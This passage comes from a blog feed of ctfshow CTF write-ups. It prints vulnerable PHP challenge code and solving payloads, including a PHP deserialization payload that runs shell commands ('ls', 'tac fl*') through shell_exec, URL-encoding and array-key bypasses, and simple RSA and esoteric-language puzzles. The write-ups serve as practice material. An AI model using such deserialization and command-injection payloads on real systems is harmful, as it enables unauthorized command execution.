punctuation">&#123;</span>              <span class="token function">assert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"intval(<span class="token interpolation"><span class="token variable">$_GET</span><span class="token punctuation">[</span>num<span class="token punctuation">]</span></span>)==1919810"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-z]|\;|\(|\)/"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>check()  true false</p></blockquote><p></p><blockquote><p><code>/?num=114514%2B1805296</code>url**%2B**flag</p></blockquote><h3 id="chatgpt"><a href="#chatgpt" class="headerlink" title="chatgpt"></a>chatgpt</h3><blockquote><p> num  GET  114514  check()<br> $flag </p><p>check()  true<br>false</p><p> 6  assert()  $_GET[num] <br>1919810 assert()<br> $_GET[num]<br></p><p> flag.php  $flag  $_GET[num]<br> $flag  check()<br></p></blockquote><h2 id="TapTapTap"><a href="#TapTapTap" class="headerlink" title="TapTapTap"></a>TapTapTap</h2><blockquote><p></p></blockquote><p>jsbase64<br><img src="https://img-blog.csdnimg.cn/5c5b3b1d2ec643d0a963c33a2fa414c7.png" alt="2"></p><blockquote><p>Your flag is in &#x2F;secret_path_you_do_not_know&#x2F;secretfile.txt</p></blockquote><p>flag</p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p><strong></strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>     <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Webshell</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'echo "Hello World!"'</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$serializecmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$unserializecmd</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serializecmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$unserializecmd</span><span class="token operator">-></span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>webshell<strong>cmd</strong>**_construct()init()exec()<strong>init()_construct()cmd</strong>flag<strong></strong>Hello World!<strong>exec()</strong>$cmd**<br><img src="https://img-blog.csdnimg.cn/b09519fa51e74250a34f9e317b3884ce.png" alt="1"><br></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Webshell</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ls"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$W</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Webshell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$W</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <strong>O:8:Webshell:1:{s:3:cmd;s:2:ls;}</strong></p><blockquote><p> cmd  Webshell s:3:cmd  3s:2:ls  $cmd  ls 2 unserialize()  Webshell </p></blockquote><p>url<code>http://a45cc446-ca14-40ca-92e4-8da67a3cc623.challenge.ctf.show/?cmd=O:8:&quot;Webshell&quot;:1:&#123;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;</code><br><img src="https://img-blog.csdnimg.cn/4cc0a2e1e93546adba733d88ea1641e3.png" alt="3"><br>url<code>http://a45cc446-ca14-40ca-92e4-8da67a3cc623.challenge.ctf.show/?cmd=O:8:&quot;Webshell&quot;:1:&#123;s:3:&quot;cmd&quot;;s:7:&quot;tac fl*&quot;;&#125;</code><br><img src="https://img-blog.csdnimg.cn/4df37ceb5f164c95b99945642caeb496.png" alt="2"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;=</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$result</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">===</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>count()get**?a&#x3D;1<strong></strong>?a&#x3D;1&amp;b&#x3D;2<strong><br>strlen()1diegetresult<br>result&#x3D;&#x3D;&#x3D;flag<br><strong></strong><br><code></code>url<code>%E5%A4%A7%E7%89%9B</code>%E5</strong><strong>url</strong>for**flag3url1-6</p><p>payload<code>http://da499d91-835d-4543-9c2e-faa0b2ea3723.challenge.ctf.show?1=%E5&amp;2=%A4&amp;3=%A7&amp;4=%E7&amp;5=%89&amp;6=%9B</code>flag</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'0'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'0'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nonono!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><br>payload<code>?0=1</code>flag</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><img src="https://img-blog.csdnimg.cn/86faa25095144eb18cf9de64afbcc1da.png" alt="1">js<br><img src="https://img-blog.csdnimg.cn/71650c9a07134eb5b6c38dbbc521594f.png" alt="1"><br>2077flag<br><img src="https://img-blog.csdnimg.cn/b6106be08f764e75a1e4894ec5956cf4.png" alt="1"><br>jsscore<br><img src="https://img-blog.csdnimg.cn/8fb09945e91f47979007d09792c3f4d9.png" alt="2"><br>275<br><img src="https://img-blog.csdnimg.cn/5e5a7f6f549649f78e132f1eea8d43e9.png" alt="3"><br><br><img src="https://img-blog.csdnimg.cn/f4ee69e852294ad4a6759ec9dc942294.png" alt="4"><br><code>var nowScore = this.score += 2078</code><br><img src="https://img-blog.csdnimg.cn/e683ba59ae094d319d18982091228622.png" alt="5"><br><br><img src="https://img-blog.csdnimg.cn/6574abd9ddaa4ac6888479fdb6939508.png" alt="6"><br>flag</p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="0x36d"><a href="#0x36d" class="headerlink" title="0x36d"></a>0x36d</h2><p></p><p><strong> </strong><br>base100<a href="https://txtmoji.com/">emojis</a>0x36d<strong>877</strong>flag</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-Crypto</title>
      <link href="/2023/02/26/ctfshow-Crypto/"/>
      <url>/2023/02/26/ctfshow-Crypto/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="jsfuck"><a href="#jsfuck" class="headerlink" title="jsfuck"></a>jsfuck</h2><p><strong>jsfuck</strong><br>flag<br><img src="https://img-blog.csdnimg.cn/9bf0f33ceb1f4c35a6b09386746ae59c.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/687b19df85a746f58df6d8da3f836637.png" alt="2"></p><h2 id="crypto3"><a href="#crypto3" class="headerlink" title="crypto3"></a>crypto3</h2><p>flag</p><h2 id="crypto4"><a href="#crypto4" class="headerlink" title="crypto4"></a>crypto4</h2><p><strong> p q e  d</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2p <span class="token operator">=</span> <span class="token number">447685307</span>q <span class="token operator">=</span> <span class="token number">2037</span>e <span class="token operator">=</span> <span class="token number">17</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/64725cd54d814229a18167911ca6c9d6.png" alt="3"></p><h2 id="crypto5"><a href="#crypto5" class="headerlink" title="crypto5"></a>crypto5</h2><p><img src="https://img-blog.csdnimg.cn/ae3ca93b1ac246b097cc59ba826eb835.png" alt="5"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># (p, q, e,c)m</span><span class="token keyword">import</span> gmpy2p<span class="token operator">=</span><span class="token number">447685307</span>q<span class="token operator">=</span><span class="token number">2037</span>e<span class="token operator">=</span><span class="token number">17</span>c<span class="token operator">=</span><span class="token number">704796792</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>m <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>p<span class="token operator">*</span>q<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="rabbit"><a href="#rabbit" class="headerlink" title="rabbit"></a>rabbit</h2><p><img src="https://img-blog.csdnimg.cn/e94a5d5a735d43d880be0981bebbbbdc.png" alt="6"></p><p><a href="http://www.jsons.cn/rabbitencrypt/">rabbit</a></p><h2 id="ook"><a href="#ook" class="headerlink" title="ook"></a>ook</h2><blockquote><p>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook?<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook?<br>Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook.<br>Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook?<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook.<br>Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook.<br>Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook. Ook.<br>Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook!<br>Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook.<br>Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!<br>Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook.<br>Ook? Ook! Ook. Ook? Ook. Ook. Ook! Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook!<br>Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook!<br>Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook!<br>Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook! Ook. Ook? Ook. </p></blockquote><p><strong>ook</strong></p><p>Ook</p><p><br><br><a href="https://tool.bugku.com/brainfuck/">Ook</a><br>Ookto test</p><h2 id="brainfuck"><a href="#brainfuck" class="headerlink" title="brainfuck"></a>brainfuck</h2><blockquote><p>+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt; -&lt;]&gt;- -.+++ +++.&lt;<br>++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++++ +++[- &gt;- -&lt; ]&gt;. ..- -.-.- .-.<br>+++++ +.. -..&lt;+ +++++ +[-&gt;+ +++++ +&lt;]&gt;+ +.&lt;++ ++++[ -&gt; &lt;] &gt;-<br> .- -.&lt;++ ++++[ -&gt;+++ +++&lt;] &gt;++++ +++++ +++.&lt; +++++ ++[-&gt; <br>&lt;]&gt; .++.- -. &lt;++++ +++[- &gt;++++ +++&lt;] &gt;+++. .&lt;+ +++++ [-&gt; -&lt;<br>]&gt;  .+ .&lt;+++ +++[- &gt;++++ ++&lt;]&gt; +++++ +++++ ++.&lt;+ +++++ [-&gt;<br>-&lt; ]&gt;  .- .++++ .&lt;+++ +++[- &gt;++++ ++&lt;]&gt; +++++ +++.&lt; +++++<br>+[-&gt;-  &lt;]&gt;  .-  .++++ +++++ .- -. &lt;++++ ++[-&gt;<br>+++++ +&lt;]&gt;+ +++++ +++++ +.&lt;++ +++[- &gt;++++ +&lt;]&gt;+ ++.&lt;</p></blockquote><p><a href="https://tool.bugku.com/brainfuck/">brainfuck</a><br><img 